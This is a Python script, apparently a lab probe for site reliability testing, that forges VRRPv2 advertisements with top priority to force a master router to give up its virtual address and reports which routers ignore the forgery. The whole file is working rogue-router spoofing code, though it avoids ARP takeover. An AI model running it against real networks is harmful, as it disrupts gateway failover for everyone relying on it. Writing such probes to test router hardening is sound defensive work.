#!/usr/bin/env python3
"""VRRP probe of the SRE labs: sends forged VRRPv2 advertisements and reports the ones it hears.

Standalone (standard library only), run as root inside a container (raw socket, IP protocol 112),
usually a hidden one.  It plays a rogue router: for a few seconds it announces a virtual router
with a priority higher than any honest one.  A master that accepts those advertisements goes to
the backup state and releases the virtual address; a master protected by a password (or by a
unicast peer list) ignores them and keeps it.  The probe never takes the virtual address itself
and sends no gratuitous ARP, so the ARP caches of the neighbours are left alone.

usage: vrrp_probe.py send --iface eth0 --vrid N --vip A [--vip B] [--priority 255]
                          [--password PW] [--interval 1] [--seconds 8] [--dst 224.0.0.18]

One JSON document on stdout::

    {"sent": 8, "error": null,
     "heard": [{"src": "192.0.2.1", "version": 2, "vrid": 51, "priority": 150, "auth_type": 1,
                "count": 7}]}

``heard`` summarises the advertisements of the other routers received meanwhile, one entry per
(source, virtual router, priority).
"""
import argparse
import json
import select
import socket
import struct
import sys
import time

VRRP_PROTO = 112
VRRP_GROUP = "224.0.0.18"
VRRP_TTL = 255
AUTH_NONE, AUTH_PASS = 0, 1
IP_MULTICAST_IF = getattr(socket, 'IP_MULTICAST_IF', 32)
IP_MULTICAST_TTL = getattr(socket, 'IP_MULTICAST_TTL', 33)
IP_MULTICAST_LOOP = getattr(socket, 'IP_MULTICAST_LOOP', 34)
IP_ADD_MEMBERSHIP = getattr(socket, 'IP_ADD_MEMBERSHIP', 35)
SO_BINDTODEVICE = getattr(socket, 'SO_BINDTODEVICE', 25)
SIOCGIFADDR = 0x8915


def checksum(data: bytes) -> int:
    """Internet checksum (RFC 1071) of *data*."""
    if len(data) % 2:
        data += b'\0'
    total = sum(struct.unpack(f"!{len(data) // 2}H", data))
    while total >> 16:
        total = (total & 0xffff) + (total >> 16)
    return ~total & 0xffff


def build_advert(vrid: int, priority: int, vips, interval: int = 1, password: str = None) -> bytes:
    """A VRRPv2 advertisement (RFC 3768): the VRRP message, without the IP header."""
    auth_type = AUTH_PASS if password else AUTH_NONE
    addresses = b''.join(socket.inet_aton(str(vip)) for vip in vips)
    auth_data = (password or '').encode()[:8].ljust(8, b'\0')
    header = struct.pack("!BBBBBBH", 0x21, vrid, priority, len(vips), auth_type, interval, 0)
    message = header + addresses + auth_data
    return message[:6] + struct.pack("!H", checksum(message)) + message[8:]


def parse_advert(packet: bytes):
    """``{'src', 'version', 'vrid', 'priority', 'auth_type'}`` of a received IPv4 packet holding a
    VRRP advertisement (``None`` for anything else)."""
    if len(packet) < 20:
        return None
    ihl = (packet[0] & 0x0f) * 4
    if packet[9] != VRRP_PROTO or len(packet) < ihl + 8:
        return None
    message = packet[ihl:]
    version, kind = message[0] >> 4, message[0] & 0x0f
    if kind != 1 or version not in (2, 3):
        return None
    return {'src': socket.inet_ntoa(packet[12:16]), 'version': version, 'vrid': message[1],
            'priority': message[2], 'auth_type': message[4] if version == 2 else 0}


def interface_address(iface: str) -> str:
    """Primary IPv4 address of *iface* (``SIOCGIFADDR``)."""
    import fcntl
    probe = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        packed = fcntl.ioctl(probe.fileno(), SIOCGIFADDR, struct.pack('256s', iface.encode()[:15]))
    finally:
        probe.close()
    return socket.inet_ntoa(packed[20:24])


def send_adverts(args) -> dict:
    result = {'sent': 0, 'error': None, 'heard': []}
    heard = {}
    try:
        local = interface_address(args.iface)
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, VRRP_PROTO)
        sock.setsockopt(socket.SOL_SOCKET, SO_BINDTODEVICE, args.iface.encode() + b'\0')
        sock.setsockopt(socket.IPPROTO_IP, IP_MULTICAST_TTL, VRRP_TTL)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, VRRP_TTL)
        sock.setsockopt(socket.IPPROTO_IP, IP_MULTICAST_LOOP, 0)
        sock.setsockopt(socket.IPPROTO_IP, IP_MULTICAST_IF, socket.inet_aton(local))
        sock.setsockopt(socket.IPPROTO_IP, IP_ADD_MEMBERSHIP,
                        socket.inet_aton(VRRP_GROUP) + socket.inet_aton(local))
    except OSError as error:
        result['error'] = f"socket: {error}"
        return result
    message = build_advert(args.vrid, args.priority, args.vip, args.interval, args.password)
    end = time.monotonic() + args.seconds
    next_send = time.monotonic()
    while True:
        now = time.monotonic()
        if now >= end:
            break
        if now >= next_send:
            try:
                sock.sendto(message, (args.dst, 0))
                result['sent'] += 1
            except OSError as error:
                result['error'] = f"send: {error}"
                break
            next_send += args.interval
        readable, _, _ = select.select([sock], [], [], max(0.0, min(next_send, end) - time.monotonic()))
        if readable:
            advert = parse_advert(sock.recv(2048))
            if advert and advert['src'] != local:
                key = (advert['src'], advert['vrid'], advert['priority'])
                entry = heard.setdefault(key, dict(advert, count=0))
                entry['count'] += 1
    sock.close()
    result['heard'] = [heard[key] for key in sorted(heard)]
    return result


def main(argv=None) -> int:
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    sub = parser.add_subparsers(dest='mode', required=True)
    send = sub.add_parser('send')
    send.add_argument('--iface', default='eth0')
    send.add_argument('--vrid', type=int, required=True)
    send.add_argument('--vip', action='append', required=True)
    send.add_argument('--priority', type=int, default=255)
    send.add_argument('--password')
    send.add_argument('--interval', type=int, default=1)
    send.add_argument('--seconds', type=float, default=8.0)
    send.add_argument('--dst', default=VRRP_GROUP)
    args = parser.parse_args(argv)
    print(json.dumps(send_adverts(args), sort_keys=True))
    return 0


if __name__ == '__main__':
    sys.exit(main())
